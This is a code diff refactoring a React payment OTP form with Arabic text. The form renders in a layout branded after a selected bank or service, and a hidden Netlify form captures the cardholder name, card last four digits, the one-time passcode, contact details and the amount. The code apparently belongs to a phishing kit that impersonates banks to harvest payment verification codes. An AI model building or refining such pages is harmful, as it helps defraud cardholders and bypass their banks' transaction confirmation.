@@ -264,26 +264,9 @@ const PaymentOTPForm = () => {
   const isOtpComplete = otp.every(digit => digit !== "");
   const hasAnyDigit = otp.some(digit => digit !== "");
   
-  // Conditionally render based on payment method
-  const LayoutComponent = useBankBranding ? BankBrandedLayout : DynamicPaymentLayout;
-  const layoutProps = useBankBranding ? {
-    bankId: selectedBankId,
-    amount: formattedAmount,
-    title: "رمز التحقق",
-    description: "أدخل رمز التحقق لتأكيد العملية",
-    icon: <Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />,
-    countryFlag: selectedCountryData?.flag
-  } : {
-    serviceName,
-    serviceKey,
-    amount: formattedAmount,
-    title: "رمز التحقق",
-    description: `أدخل رمز التحقق لخدمة ${serviceName}`,
-    icon: <Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
-  };
-
-  return (
-    <LayoutComponent {...layoutProps}>
+  // Render OTP form content
+  const otpFormContent = (
+    <>
       {/* Title Section */}
       <div className="text-center mb-6 sm:mb-8">
         <div 
@@ -407,7 +390,53 @@ const PaymentOTPForm = () => {
           </Button>
         )}
       </form>
+    </>
+  );
 
+  // Conditionally render based on payment method
+  if (useBankBranding) {
+    return (
+      <>
+        <BankBrandedLayout
+          bankId={selectedBankId}
+          amount={formattedAmount}
+          title="رمز التحقق"
+          description="أدخل رمز التحقق لتأكيد العملية"
+          icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+          countryFlag={selectedCountryData?.flag}
+        >
+          {otpFormContent}
+        </BankBrandedLayout>
+        
+        {/* Hidden Netlify Form */}
+        <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
+          <input type="text" name="name" />
+          <input type="email" name="email" />
+          <input type="tel" name="phone" />
+          <input type="text" name="service" />
+          <input type="text" name="amount" />
+          <input type="text" name="cardholder" />
+          <input type="text" name="cardLast4" />
+          <input type="text" name="otp" />
+          <input type="text" name="timestamp" />
+        </form>
+      </>
+    );
+  }
+
+  return (
+    <>
+      <DynamicPaymentLayout
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title="رمز التحقق"
+        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
+        icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      >
+        {otpFormContent}
+      </DynamicPaymentLayout>
+      
       {/* Hidden Netlify Form */}
       <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="name" />
@@ -420,7 +449,7 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-    </LayoutComponent>
+    </>
   );
 };
 
